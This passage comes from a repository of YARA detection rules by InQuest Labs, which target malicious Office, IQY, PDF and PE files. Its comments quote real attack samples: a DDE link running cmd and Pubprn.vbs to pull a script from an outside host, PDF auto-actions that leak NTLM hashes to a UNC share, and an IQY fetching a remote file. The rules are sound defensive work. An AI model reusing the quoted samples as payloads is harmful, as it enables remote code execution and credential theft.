            $macro_sheet_h2 = {85 00 ?? ?? ?? ?? ?? ?? 02 01}
    condition:
            $ole_marker at 0 and 1 of ($macro_sheet_h*)
}
// see the relevant post at: http://blog.inquest.net/blog/2019/01/29/Carving-Sneaky-XLM-Files/
rule Executable_Converted_to_MSI
{
    meta:
        Author      = "InQuest Labs"
        URL         = "https://github.com/InQuest/yara-rules"
        Description = "http://blog.inquest.net/blog/2019/01/29/Carving-Sneaky-XLM-Files/"
    strings:
        $magic = /^\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1\x00\x00\x00/
        $url   = "www.exetomsi.com" nocase
    condition:
        $magic at 0 and $url
}
rule Hex_Encoded_Powershell
{
    meta:
        Author    = "InQuest Labs"
        Reference = "https://twitter.com/InQuest/status/1200125251675398149"
        Sample    = "https://labs.inquest.net/dfi/sha256/c430b2b2885804a638fc8d850b1aaca9eb0a981c7f5f9e467e44478e6bc961ee"
        Similar   = "https://labs.inquest.net/dfi/search/ext/ext_context/67697468756275736572636F6E74656E742E636F6D2F6A6F686E646F657465"

    strings:
        // http or https, powershell, invoke-webrequest
        // generated via: https://labs.inquest.net/tools/yara/iq-mixed-case
        $http = /[46]8[57]4[57]4[57]0([57]3)?3a2f2f/ nocase
        $powershell = /[57]0[46]f[57]7[46]5[57]2[57]3[46]8[46]5[46]c[46]c/ nocase
        $invoke = /[46]9[46]e[57]6[46]f[46]b[46]52d[57]7[46]5[46]2[57]2[46]5[57]1[57]5[46]5[57]3[57]4/ nocase

    condition:
        all of them
}
rule Hidden_Bee_Elements
{
    meta:
        Author      = "InQuest Labs"
        Reference   = "https://blog.malwarebytes.com/threat-analysis/2018/08/reversing-malware-in-a-custom-format-hidden-bee-elements/"
        Description = "This signature detects a custom Windows executable format used in relation to Hidden Bee and Underminer exploit kit."

    strings:
        /*
            sample payloads:
                https://www.virustotal.com/#/file/76b70f1dfd64958fca7ab3e18fffe6d551474c2b25aaa9515181dec6ae112895/details
                download: https://github.com/InQuest/malware-samples/blob/master/2018-08-Hidden-Bee-Elements/11310b509f8bf86daa5577758e9d1eb5

                https://www.virustotal.com/#/file/c1a6df241239359731c671203925a8265cf82a0c8c20c94d57a6a1ed09dec289/details
                download: https://github.com/InQuest/malware-samples/blob/master/2018-08-Hidden-Bee-Elements/b3eb576e02849218867caefaa0412ccd

             $ yara Hidden_Bee_Elements.rule -wr ../malware-samples/2018-08-Hidden-Bee-Elements/
                 Hidden_Bee_Elements ../malware-samples/2018-08-Hidden-Bee-Elements//b3eb576e02849218867caefaa0412ccd
                 Hidden_Bee_Elements ../malware-samples/2018-08-Hidden-Bee-Elements//11310b509f8bf86daa5577758e9d1eb5

            IDA loader module creation write-up and source from @RolfRolles:
                http://www.msreverseengineering.com/blog/2018/9/2/weekend-project-a-custom-ida-loader-module-for-the-hidden-bee-malware-family
                https://github.com/RolfRolles/HiddenBeeLoader

            Binary file format struct from @hasherezade:
                typedef struct {
                    DWORD magic;

                    WORD dll_list;
                    WORD iat;
                    DWORD ep;
                    DWORD mod_size;

                    DWORD relocs_size;
                    DWORD relocs;
                } t_bee_hdr;
        */

        $magic = { 01 03 00 10 }
        $dll   = /(ntdll|kernel32|advapi32|cabinet|msvcrt|ws2_32|phlpape)\.dll/ nocase ascii wide fullword
        
        // case-insensitive base64 http:// or https:// URI prefix
        // algorithm behind this generation magic: http://www.erlang-factory.com/upload/presentations/225/ErlangFactorySFBay2010-RobKing.pdf
        $b64_uri = /([\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx][Io][Vd][FH][R][Qw][O]i\x38v[\x2b\x2f-\x39A-Za-z]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx][Io][Vd][FH][R][Qw][Uc][z]ovL[\x2b\x2f-\x39w-z]|[\x2b\x2f-\x39A-Za-z][\x30\x32EGUWkm][h][\x30U][Vd][FH][A]\x36Ly[\x2b\x2f\x38-\x39]|[\x2b\x2f-\x39A-Za-z][\x30\x32EGUWkm][h][\x30U][Vd][FH][B][Tz][O]i\x38v[\x2b\x2f-\x39A-Za-z]|[Sa][FH][R][\x30U][Uc][D]ovL[\x2b\x2f-\x39w-z]|[Sa][FH][R][\x30U][Uc][FH][M]\x36Ly[\x2b\x2f\x38-\x39])/

    condition:
        $magic at 0
            and
        (
            // at least 3 known DLL imports in the first 128 bytes.
            for all i in (1..3) : (@dll[i] < 128)

                or

            // base64 encoded URLs.
            $b64_uri
        )
}
// NOTE: InQuest didn't write this rule, we just wanted to mirror it for reference from the awesome-yara repository.
rule Hunting_Rule_ShikataGaNai
{
    meta:
        author    = "Steven Miller"
        company   = "FireEye"
        reference = "https://www.fireeye.com/blog/threat-research/2019/10/shikata-ga-nai-encoder-still-going-strong.html"
    strings:
        $varInitializeAndXorCondition1_XorEAX = { B8 ?? ?? ?? ?? [0-30] D9 74 24 F4 [0-10] ( 59 | 5A | 5B | 5C | 5D | 5E | 5F ) [0-50] 31 ( 40 | 41 | 42 | 43 | 45 | 46 | 47 ) ?? }
        $varInitializeAndXorCondition1_XorEBP = { BD ?? ?? ?? ?? [0-30] D9 74 24 F4 [0-10] ( 58 | 59 | 5A | 5B | 5C | 5E | 5F ) [0-50] 31 ( 68 | 69 | 6A | 6B | 6D | 6E | 6F ) ?? }
        $varInitializeAndXorCondition1_XorEBX = { BB ?? ?? ?? ?? [0-30] D9 74 24 F4 [0-10] ( 58 | 59 | 5A | 5C | 5D | 5E | 5F ) [0-50] 31 ( 58 | 59 | 5A | 5B | 5D | 5E | 5F ) ?? }
        $varInitializeAndXorCondition1_XorECX = { B9 ?? ?? ?? ?? [0-30] D9 74 24 F4 [0-10] ( 58 | 5A | 5B | 5C | 5D | 5E | 5F ) [0-50] 31 ( 48 | 49 | 4A | 4B | 4D | 4E | 4F ) ?? }
        $varInitializeAndXorCondition1_XorEDI = { BF ?? ?? ?? ?? [0-30] D9 74 24 F4 [0-10] ( 58 | 59 | 5A | 5B | 5C | 5D | 5E ) [0-50] 31 ( 78 | 79 | 7A | 7B | 7D | 7E | 7F ) ?? }
        $varInitializeAndXorCondition1_XorEDX = { BA ?? ?? ?? ?? [0-30] D9 74 24 F4 [0-10] ( 58 | 59 | 5B | 5C | 5D | 5E | 5F ) [0-50] 31 ( 50 | 51 | 52 | 53 | 55 | 56 | 57 ) ?? }
        $varInitializeAndXorCondition2_XorEAX = { D9 74 24 F4 [0-30] B8 ?? ?? ?? ?? [0-10] ( 59 | 5A | 5B | 5C | 5D | 5E | 5F ) [0-50] 31 ( 40 | 41 | 42 | 43 | 45 | 46 | 47 ) ?? }
        $varInitializeAndXorCondition2_XorEBP = { D9 74 24 F4 [0-30] BD ?? ?? ?? ?? [0-10] ( 58 | 59 | 5A | 5B | 5C | 5E | 5F ) [0-50] 31 ( 68 | 69 | 6A | 6B | 6D | 6E | 6F ) ?? }
        $varInitializeAndXorCondition2_XorEBX = { D9 74 24 F4 [0-30] BB ?? ?? ?? ?? [0-10] ( 58 | 59 | 5A | 5C | 5D | 5E | 5F ) [0-50] 31 ( 58 | 59 | 5A | 5B | 5D | 5E | 5F ) ?? }
        $varInitializeAndXorCondition2_XorECX = { D9 74 24 F4 [0-30] B9 ?? ?? ?? ?? [0-10] ( 58 | 5A | 5B | 5C | 5D | 5E | 5F ) [0-50] 31 ( 48 | 49 | 4A | 4B | 4D | 4E | 4F ) ?? }
        $varInitializeAndXorCondition2_XorEDI = { D9 74 24 F4 [0-30] BF ?? ?? ?? ?? [0-10] ( 58 | 59 | 5A | 5B | 5C | 5D | 5E ) [0-50] 31 ( 78 | 79 | 7A | 7B | 7D | 7E | 7F ) ?? }
        $varInitializeAndXorCondition2_XorEDX = { D9 74 24 F4 [0-30] BA ?? ?? ?? ?? [0-10] ( 58 | 59 | 5B | 5C | 5D | 5E | 5F ) [0-50] 31 ( 50 | 51 | 52 | 53 | 55 | 56 | 57 ) ?? }
    condition:
        any of them
}
rule IQY_File
{
    meta:
        Author = "InQuest Labs"
        Reference = "https://www.inquest.net"
        Description = "Detects all Excel IQY files by identifying the WEB 'magic' on the first line and also includes any URL."
        Severity = "0"

   strings:
        /* match WEB on the first line of a file
           takes into account potential whitespace before or after case-insensitive "WEB" string
        */
        $web = /^[ \t]*WEB[ \t]*(\x0A|\x0D\x0A)/ nocase

        /* match any http or https URL within the file */
        $url = /https?:\/\/([\w\.-]+)([\/\w \.-]*)/

    condition:
        $web at 0 and $url
}
rule IQY_File_With_Pivot_Extension_URL
{
    meta:
        Author = "InQuest Labs"
        Reference = "https://www.inquest.net"
        Description = "Detect Excel IQY files with URLs that contain commonly used malicious file extensions that may act as a pivot to a secondary stage."
        Severity = "9"
    strings:
        /*
           match WEB on the first line of a file
           takes into account potential whitespace before or after case-insensitive "WEB" string
        */
         $web = /^[ \t]*WEB[ \t]*(\x0A|\x0D\x0A)/ nocase

        /*
            generic URL to direct download a file containing a potentially malicious extension.
            File extensions were decided based upon common extensions seen in the wild
            The extension list can be expanded upon as new information comes available from matches
            on the Stage 1 or Stage 2 signatures
         */

        $url = /https?:\/\/[\w\.\/]+\.(scr|exe|hta|vbs|ps1|bat|dat|rar|zip|ace)/ nocase

    condition:
        $web at 0 and $url
}
rule IQY_File_With_Suspicious_URL
{
    meta:
        Author = "InQuest Labs"
        Reference = "https://www.inquest.net/"
        Description = "Detects suspicious IQY Files using URLs associated with suspicious activity such as direct IP address URLs, URL shorteners, and file upload/download providers."
        Severity = "5"

    strings:
        /*
           match WEB on the first line of a file
           takes into account potential whitespace before or after case-insensitive "WEB" string
        */
         $web =/^[ \t]*WEB[ \t]*(\x0A|\x0D\x0A)/ nocase

        /* match any http or https URL using a direct IP address */
        $aa = /https?:\/\/((1?[0-9]{1,2}|25[0-5]|2[0-4][0-9])[.]){3}((1?[0-9]{1,2}|25[0-5]|2[0-4][0-9]))/

        /* file upload/download providers */
        $a2  = /https?:\/\/[^\.]*dropbox\.com\/sh?\// nocase
        $a4  = /https?:\/\/[^\.]*sendspace\.com\/./ nocase
        $a5  = /https?:\/\/[^\.]*bvp\.16mb\.com\/./ nocase
        $a6  = /https?:\/\/[^\.]*file\.io\/./ nocase
        $a7  = /https?:\/\/[^\.]*wetransfer\.com\/./ nocase
        $a8  = /https?:\/\/[^\.]*uploadcare\.com\/./ nocase
        $a9  = /https?:\/\/[^\.]*uploadfiles\.io\/./ nocase
        $a10 = /https?:\/\/[^\.]*filedropper\.com\/./ nocase
        $a11 = /https?:\/\/[^\.]*filefactory\.com\/./ nocase
        $a12 = /https?:\/\/[^\.]*doko\.moe\/./ nocase

        /* URL shorteners */
        $a109 = /https?:\/\/(www\.)?a\.gd\/./ nocase
        $a110 = /https?:\/\/(www\.)?binged\.it\/./ nocase
        $a112 = /https?:\/\/(www\.)?budurl\.com\/./ nocase
        $a113 = /https?:\/\/(www\.)?chilp\.it\/./ nocase
        $a114 = /https?:\/\/(www\.)?cli\.gs\/./ nocase
        $a115 = /https?:\/\/(www\.)?fon\.gs\/./ nocase
        $a117 = /https?:\/\/(www\.)?fwd4\.me\/./ nocase
        $a118 = /https?:\/\/(www\.)?hex\.io\/./ nocase
        $a119 = /https?:\/\/(www\.)?hurl\.ws\/./ nocase
        $a120 = /https?:\/\/(www\.)?is\.gd\/./ nocase
        $a121 = /https?:\/\/(www\.)?kl\.am\/./ nocase
        $a122 = /https?:\/\/(www\.)?short\.ie\/./ nocase
        $a123 = /https?:\/\/(www\.)?short\.to\/./ nocase
        $a124 = /https?:\/\/(www\.)?sn\.im\/./ nocase
        $a125 = /https?:\/\/(www\.)?snipr\.com\/./ nocase
        $a126 = /https?:\/\/(www\.)?snipurl\.com\/./ nocase
        $a127 = /https?:\/\/(www\.)?snurl\.com\/./ nocase
        $a130 = /https?:\/\/(www\.)?to\.ly\/./ nocase
        $a131 = /https?:\/\/(www\.)?tr\.im\/./ nocase
        $a132 = /https?:\/\/(www\.)?tweetburner\.com\/./ nocase
        $a133 = /https?:\/\/(www\.)?twurl\.nl\/./ nocase
        $a134 = /https?:\/\/(www\.)?ub0\.cc\/./ nocase
        $a135 = /https?:\/\/(www\.)?ur1\.ca\/./ nocase
        $a136 = /https?:\/\/(www\.)?urlborg\.com\/./ nocase
        $a137 = /https?:\/\/(www\.)?tiny\.cc\/./ nocase
        $a138 = /https?:\/\/(www\.)?lc\.chat\/./ nocase
        $a139 = /https?:\/\/(www\.)?soo\.gd\/./ nocase
        $a140 = /https?:\/\/(www\.)?s2r\.co\/./ nocase
        $a141 = /https?:\/\/(www\.)?clicky\.me\/./ nocase
        $a142 = /https?:\/\/(www\.)?bv\.vc\/./ nocase
        $a143 = /https?:\/\/(www\.)?s\.id\/./ nocase
        $a144 = /https?:\/\/(www\.)?smarturl\.it\/./ nocase
        $a145 = /https?:\/\/(www\.)?tiny\.pl\/./ nocase
        $a146 = /https?:\/\/(www\.)?x\.co\/./ nocase

    condition:
        $web at 0 and 1 of ($a*)
}
rule SC_Microsoft_Excel_Data_Connection
{
    meta:
        Author      = "InQuest Labs"
        URL         = "https://github.com/InQuest/yara-rules"
        Description = "https://inquest.net/blog/2020/03/18/Getting-Sneakier-Hidden-Sheets-Data-Connections-and-XLM-Macros"
    strings:
        $magic = { D0 CF 11 E0 A1 B1 1A E1 00 00 00 }
        $url = /https?:\/\/[\w\/\.\-]+/ nocase ascii wide
        // 0x876 = DCONN then we want to ensure that the records fBackgroundQuery flag (bit) is raised.
        $dconn = /\x76\x08\x00\x00\x04\x00[\x40-\x7f\xc0-\xff]/
    condition:
        $magic in (0..1024) and $dconn and $url
}
/*

 Follow the conversation on Twitter:

    https://twitter.com/i/moments/918126999738175489

 Read up on the exposure, mitigation, detection / hunting, and sample dissection from our blogs:

    http://blog.inquest.net/blog/2017/10/13/microsoft-office-dde-macro-less-command-execution-vulnerability/
    http://blog.inquest.net/blog/2017/10/14/02-microsoft-office-dde-freddie-mac-targeted-lure/
    http://blog.inquest.net/blog/2017/10/14/01-microsoft-office-dde-sec-omb-approval-lure/
    http://blog.inquest.net/blog/2017/10/14/03-microsoft-office-dde-poland-ransomware/

 InQuest customers can detect related events on their network by searching for:

    event ID 5000728, Microsoft_Office_DDE_Command_Exec

*/

rule MC_Office_DDE_Command_Execution
{
    meta:
        Author      = "InQuest Labs"
        URL         = "https://github.com/InQuest/yara-rules"
        Description = "This rule looks for a variety of DDE command execution techniques."

    strings:
        /*
            standard:
                <w:fldChar w:fldCharType="begin"/></w:r><w:r>
                <w:instrText xml:space="preserve"> </w:instrText></w:r><w:r><w:rPr>
                <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/><w:color w:val="333333"/>
                <w:sz w:val="21"/><w:szCs w:val="21"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/></w:rPr>
                <w:instrText>DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"</w:instrText></w:r>
                <w:bookmarkStart w:id="0" w:name="_GoBack"/>
                <w:bookmarkEnd w:id="0"/><w:r>
                <w:instrText xml:space="preserve"> </w:instrText></w:r><w:r>
                <w:fldChar w:fldCharType="end"/></w:r>

            encompassed:
                # e 313fc5bd8e1109d35200081e62b7aa33197a6700fc390385929e71aabbc4e065
                [root@INQ-PPSandbox tge-zip-1-1]# cat xl/externalLinks/externalLink1.xml
                <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
                <externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" mc:Ignorable="x14" xmlns:x14="http://schemas.microsoft.com/office/spreadsheetml/2009/9/main">
                    <ddeLink xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" ddeService="cmd" ddeTopic=" /C Cscript %WINDIR%\System32\Printing_Admin_Scripts\en-US\Pubprn.vbs localhost &quot;script:https://gunsandroses.live/ticket-id&quot;">
                        <ddeItems>
                            <ddeItem name="A0" advise="1" />
                            <ddeItem name="StdDocumentName" ole="1" advise="1" />
                        </ddeItems
                        </ddeLink
                </externalLink>
        */

        // standard DDE with optional AUTO.
        $dde = />\s*DDE(AUTO)?\s*</ nocase wide ascii

        // NOTE: we must remain case-insensitive but do not wish to fire on "<w:webHidden/>".
        // NOTE: nocase does not apply to character ranges ([^A-Za-z0-9-]).
        $dde_auto = /<\s*w:fldChar\s+w:fldCharType\s*=\s*['"]begin['"]\s*\/>.+[^A-Za-z0-9-]DDEAUTO[^A-Za-z0-9-].+<w:fldChar\s+w:fldCharType\s*=\s*['"]end['"]\s*\/>/ nocase wide ascii

        // DDEAUTO is the only known vector at the moment, widening the detection here other possible vectors.
        $dde_other = /<\s*w:fldChar\s+w:fldCharType\s*=\s*['"]begin['"]\s*\/>.+[^A-Za-z0-9-]DDE[B-Zb-z]+[^A-Za-z0-9-].+<w:fldChar\s+w:fldCharType\s*=\s*['"]end['"]\s*\/>/ nocase wide ascii

        // a wider DDEAUTO condition for older versions of Word (pre 2007, non DOCX).
        $magic = /^\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1\x00\x00\x00/
        $wide_dde_auto = /.+[^A-Za-z0-9-]DDEAUTO[^a-z0-9-].+/ nocase wide ascii

        // obfuscated with XML. use an early exit because this is an expensive regex.
        // NOTE: this is exactly the reason we have a DFI stack ... to strip, simplify, augment, transform, and make life easier for Yara rule dev.
        // NOTE: we prefer to use $xml_obfuscated, but it's not suitable for VTI hunt, perf warnings are a no-go.
        // NOTE: xml_obfuscated_{1,6} also won't fly for VTI, they are left here for reference.
        // NOTE: xml_obfuscated_{4,5} are prone to false positives, they are left here for reference.
        $early_exit       = "fldChar" nocase wide ascii
        //$xml_obfuscated   = /!?(<[^>]*>){0,10}['"]?(<[^>]*>){0,10}D(<[^>]*>){0,10}D(<[^>]*>){0,10}E(<[^>]*>){0,10}(A(<[^>]*>){0,10}U(<[^>]*>){0,10}T(<[^>]*>){0,10}O)?(<[^>]*>){0,10}['"]?/ nocase wide ascii
        //$xml_obfuscated_1 = />\s*["']?D\s*</   nocase ascii wide
        $xml_obfuscated_2 = />\s*["']?DD\s*</  nocase ascii wide
        $xml_obfuscated_3 = />\s*["']?DDE\s*</ nocase ascii wide
        //$xml_obfuscated_4 = />\s*DDE["']?\s*</ nocase ascii wide
        //$xml_obfuscated_5 = />\s*DE["']?\s*</  nocase ascii wide
        //$xml_obfuscated_6 = />\s*E["']?\s*</   nocase ascii wide

        // fully encompassed in XML
        $pure_xml_dde = /<\s*ddeLink[^>]+ddeService\s*=\s*["'](cmd|reg|mshta|regsvr32|[wc]script|powershell|bitsadmin|schtasks|rundll32)["'][^>]+ddeTopic/ nocase wide ascii

        // NOTE: these strings can be broken apart with XML constructs. additional post processing is required to avoid evasion.
        $exec_action = /(cmd\.exe|reg\.exe|mshta\.exe|regsvr32|[wc]script|powershell|bitsadmin|schtasks|rundll32)/ nocase wide ascii

        // QUOTE obfuscation technique.
        $quote_obfuscation = /w:instr\s*=\s*["']\s*QUOTE\s+\d+\s+/ nocase wide ascii

    condition:
        ((any of ($dde*) or ($magic at 0 and $wide_dde_auto)) and ($exec_action or $quote_obfuscation))
            or
        ($early_exit and any of ($xml_obfuscated*))
            or
        ($pure_xml_dde)
            or
        (
       	    // '{\rt' (note that full header is *NOT* required: '{\rtf1')
	    // trigger = '{\rt' nocase
            // generated via https://labs.inquest.net/tools/yara/iq-uint-trigger
    	    for any i in (0..30) : ((uint32be(i) | 0x2020) == 0x7b5c7274 and $exec_action)
        )
}
/*
Detect Microsoft Office documents with embedded Adobe Flash files. Following the conversation at:

    http://blog.inquest.net/blog/2018/02/07/cve-2018-4878-adobe-flash-0day-itw
    https://twitter.com/i/moments/960633253165191170

 InQuest customers can detect related events on their network by searching for:

    event ID 3000032
*/

rule Microsoft_Office_Document_with_Embedded_Flash_File
{
    meta:
        Author      = "InQuest Labs"
        URL         = "https://github.com/InQuest/yara-rules"
        Description = "Detect Microsoft Office documents with embedded Adobe Flash files."
    strings:
        $a = { 6e db 7c d2 6d ae cf 11 96 b8 44 45 53 54 00 00 }
        $b = { 57 53 }
    condition:
        $a and $b
}
rule Microsoft_XLSX_with_Macrosheet
{
    meta:
        Author      = "InQuest Labs"
        URL         = "https://inquest.net/blog/2020/05/06/ZLoader-4.0-Macrosheets-Evolution"
        Description = "Basic hunt rule for XLS* with macrosheets." 

    strings:
        $magic_xlsx  = /^\x50\x4B\x03\x04/
        $anchor_xlsx = /xl\/macrosheets\/[a-zA-Z0-9_-]+\.xmlPK/

    condition:
        $magic_xlsx at 0 and $anchor_xlsx
}
// see the relevant post at: http://blog.inquest.net/blog/2019/01/29/Carving-Sneaky-XLM-Files/
rule MSIExec_Pivot
{
    meta:
        Author      = "InQuest Labs"
        URL         = "https://github.com/InQuest/yara-rules"
        Description = "http://blog.inquest.net/blog/2019/01/29/Carving-Sneaky-XLM-Files/"

    strings:
        $serf19   = "serf=19" nocase ascii wide
        $msiserf1 = "msiexec" nocase ascii wide
        $msiserf2 = "serf="   nocase ascii wide
        $msiserf3 = "http"    nocase ascii wide
    condition:
        $serf19 or all of ($msiserf*)
}
/*
This signature detects Adobe PDF files that reference a remote UNC object for the purpose of leaking NTLM hashes.
New methods for NTLM hash leaks are discovered from time to time. This particular one is triggered upon opening of a
malicious crafted PDF. Original write-up from CheckPoint:

    https://research.checkpoint.com/ntlm-credentials-theft-via-pdf-files/

Public proof-of-concepts:

    https://github.com/deepzec/Bad-Pdf
    https://github.com/3gstudent/Worse-PDF

Requirements:
    /AA for Auto Action
    /O for open is functionally equivalent to /C for close.
    /S + /GoToE (Embedded) can be swapped with /GoToR (Remote).
    /D location reference.
    /F the UNC reference.

Multiple different arrangements, example one:

    /AA <<
        /O <<
            /F (\\\\10.20.30.40\\test)
            /D [ 0 /Fit]
            /S /GoToR
            >>
example two:

    /AA <<
        /C <<
            /D [ 0 /Fit]
            /S /GoToE
            /F (\\\\10.20.30.40\\test)
            >>

example three:

    /AA <<
        /O <<
            /D [ 0 /Fit]
            /F (\\\\10.20.30.40\\test)
            /S /GoToR
            >>

Multiple protocols supported for the /F include, both http and UNC.
*/

rule NTLM_Credential_Theft_via_PDF
{
    meta:
        Author      = "InQuest Labs"
        URL         = "https://github.com/InQuest/yara-rules"
        Description = "This signature detects Adobe PDF files that reference a remote UNC object for the purpose of leaking NTLM hashes."

    strings:
        // we have three regexes here so that we catch all possible orderings but still meet the requirement of all three parts.
        $badness1 = /\s*\/AA\s*<<\s*\/[OC]\s*<<((\s*\/\D\s*\[[^\]]+\])(\s*\/S\s*\/GoTo[ER])|(\s*\/S\s*\/GoTo[ER])(\s*\/\D\s*\[[^\]]+\]))\s*\/F\s*\((\\\\\\\\[a-z0-9]+\.[^\\]+\\\\[a-z0-9]+|https?:\/\/[^\)]+)\)/ nocase
        $badness2 = /\s*\/AA\s*<<\s*\/[OC]\s*<<\s*\/F\s*\((\\\\\\\\[a-z0-9]+\.[^\\]+\\\\[a-z0-9]+|https?:\/\/[^\)]+)\)((\s*\/\D\s*\[[^\]]+\])(\s*\/S\s*\/GoTo[ER])|(\s*\/S\s*\/GoTo[ER])(\s*\/\D\s*\[[^\]]+\]))/ nocase
        $badness3 = /\s*\/AA\s*<<\s*\/[OC]\s*<<((\s*\/\D\s*\[[^\]]+\])\s*\/F\s*\((\\\\\\\\[a-z0-9]+\.[^\\]+\\\\[a-z0-9]+|https?:\/\/[^\)]+)\)(\s*\/S\s*\/GoTo[ER])|(\s*\/S\s*\/GoTo[ER])\s*\/F\s*\(\\\\\\\\[a-z0-9]+.[^\\]+\\\\[a-z0-9]+\)(\s*\/\D\s*\[[^\]]+\]))/ nocase

    condition:
        for any i in (0..1024) : (uint32be(i) == 0x25504446) and any of ($badness*)
}
rule PDF_Document_with_Embedded_IQY_File
{
    meta:
        Author = "InQuest Labs"
        Description = "This signature detects IQY files embedded within PDF documents which use a JavaScript OpenAction object to run the IQY."
        Reference = "https://blog.inquest.net"  
  
    strings:
        $pdf_magic = "%PDF"
        $efile = /<<\/JavaScript [^\x3e]+\/EmbeddedFile/        
        $fspec = /<<\/Type\/Filespec\/F\(\w+\.iqy\)\/UF\(\w+\.iqy\)/
        $openaction = /OpenAction<<\/S\/JavaScript\/JS\(/
        
        /*
          <</Type/Filespec/F(10082016.iqy)/UF(10082016.iqy)/EF<</F 1 0 R/UF 1 0 R>>/Desc(10082016.iqy)>> 
          ...
          <</Names[(10082016.iqy) 2 0 R]>>
          ...
          <</JavaScript 9 0 R/EmbeddedFiles 10 0 R>>
          ...
          OpenAction<</S/JavaScript/JS(
        */
        
        /*
            obj 1.9
             Type: /EmbeddedFile
             Referencing:
             Contains stream
              <<
                /Length 51
                /Type /EmbeddedFile
                /Filter /FlateDecode
                /Params
                  <<
                    /ModDate "(D:20180810145018+03'00')"
                    /Size 45
                  >>
              >>
             WEB
            1
            http://i86h.com/data1.dat
            2
            3
            4
            5
        */
   
   condition:
      $pdf_magic in (0..60)  and all of them
}
rule PE_File
{
    meta:
        Author      = "InQuest Labs"
        URL         = "https://github.com/InQuest/yara-rules"
        Description = "Discover embedded PE files, without relying on easily stripped/modified header strings."
    strings:
        $mz = { 4D 5A }
    condition:
        for any i in (1..#mz):
        (
            uint32(@mz[i] + uint32(@mz[i] + 0x3C)) == 0x00004550
        )
}
/*

This signature is designed to detect the obfuscation method described by Boris Larin here:

    Disappearing bytes: Reverse engineering the MS Office RTF parser
    https://securelist.com/disappearing-bytes/84017/
    February 21st 2018

An excellent write-up and highly recommended read. In essence, by reverse engineering the RTF
parsing state machine, he was able to find a character sequence that would result in what we
like to call a "byte nibble".

This technique was interesting when we first saw it back in February, it's even more interesting
today however in light of the patching of the following in-the-wild exploited 0day:

    CVE-2018-8174: Microsoft VBScript Use-After-Free (aka Double Kill)

The vulnerability affected Internet Explorer / VBScript and was originally discovered by Qihoo
security researchers who noticed the 0day in the wild on April 20th. They dubbed it "Double Kill"
but kept specifics under wrap. Microsoft released a patch on May 8th.

An initial public report, from the Qihoo 360 Security team:

    https://weibo.com/ttarticle/p/show?id=2309404230886689265523

A very well done and complete dissection from the researchers at Kaspersky (kudos to Boris again!):

    https://securelist.com/root-cause-analysis-of-cve-2018-8174/85486/

Note that the 0day was exploited via a second stage payload triggered with the opening of a
malicious RTF document. That document, originally uploaded to VirusTotal on April 18, leverages
the disappearing bytes technique detailed earlier:

    https://www.virustotal.com/en/file/10ceb5916cd90e75f8789881af40287c655831c5086ae1575b327556b63cdb24/analysis

We'll continue to earmark interesting tidbits around the subject matter here:

    https://twitter.com/i/moments/994122868949770240

We have two versions of this rule for your hunting pleasure. It's worth mentioning that searching
through our past few months of harvested RTF samples ... only the 0day sample in question triggered
an alert. Certainly, the usage of this obfuscation technique will ramp up.

Update July 2018:

    https://www.fireeye.com/blog/threat-research/2018/07/microsoft-office-vulnerabilities-used-to-distribute-felixroot-backdoor.html

The carrier in the FireEye report above utilizes the byte-nibble technique. Some additional hashes to play with from VT:

    first_seen,sha256
    2018-04-18 06:57:18,10ceb5916cd90e75f8789881af40287c655831c5086ae1575b327556b63cdb24
    2018-05-09 21:07:27,de1409ccd869153ab444de9740b1733e50f182beea5daea7a9b77e56bd354aa9
    2018-05-14 16:44:06,7532ef45138d57ac4ed9eeec0f62f9edef4447723efde66bffcff38175f6d62d
    2018-05-15 08:41:59,6e2a271f9e137bc8c62fa304ede3b5bac046f4957d3f8249dde60357463e651d
    2018-05-18 14:33:24,0655d58db2798ad8336f92dd580f988312f37f3e52b405c9c71d3afd2bd2c290
    2018-05-18 17:04:52,758a0e300edff045ede857ad4b01c4d51f373add59c43b78047dd69ce4c7765a
    2018-06-06 14:12:51,d78fac933ab239c12ce24244188e65dea150ddd183fd88417d9c311914af30c2
    2018-06-27 09:03:21,7a0c20c85f01a9d11e2b5f67483d154864b1a1dc8112566df156f8232d38a4d5
    2018-06-27 09:18:37,5484b0f37f21861c480f43c40168d9767bf619dfcd92436193ab7d7aee188fc4
    2018-06-27 11:50:56,96e8aae58cd3e4a39238372cb67a99441f78d6c92fd78c3c9ba16424b99ba3cf
    2018-06-27 12:06:09,48aa32a4490beefc488add66df46b75bbd480af9cedebaa0c096ac216dd08d79
    2018-06-27 12:21:21,0c91e70676609b765e4d20afa992660f306798af60f9c164dd41336590636864
    2018-07-06 11:53:40,e6c37c6d6ce40ca9ffd4b0ad63d1399f11949fc28a2cf66282daa54645f24b4c
    2018-07-11 03:47:27,45a86012cb99762d57d0fe1626d5cdc9046751e26eac7d9ef0e8adedb03b8661
    2018-07-18 01:33:45,54b32a37fc521c258da32fd15acb580d03b820ff69977696af5a134edea48f86
    2018-07-18 08:35:46,cd4de8bfd2ac80175f83c6f2f754c9c0f693dc081d16e5035c208ca384e01b02
    2018-07-19 01:09:45,884303b1f4fe64f7ac19f5fbea9afb72f6cd5cd069e195452e5c77cc07fefab9
    2018-07-20 01:38:19,62c03c4cd9d94029be4e38c4cbaf934a3a19919fab6ef3561a22f544bc892a2f
    2018-07-23 10:35:39,3f922fe437a4394c9c35dbf05252ff8fa20e2bbf10eb726ba9398c933c797837
    2018-07-27 09:26:52,008d54ba06ec1b5fd909c1e0e9d9ba9a23c6d9a11d6e0f6910877e639b31c529

For those of you without VT access, those samples are available in our malware-samples repository at:

    https://github.com/InQuest/malware-samples/tree/master/2018-08-RTF-Byte-Nibble-Obfuscation
*/

rule RTF_Byte_Nibble_Obfuscation_method1
{
    meta:
        Author      = "InQuest Labs"
        URL         = "https://github.com/InQuest/yara-rules"
        Description = "This signature is designed to detect the obfuscation method described by Boris Larin here https://securelist.com/disappearing-bytes/84017/"
    strings:
        $magic    = {7b 5c 72}
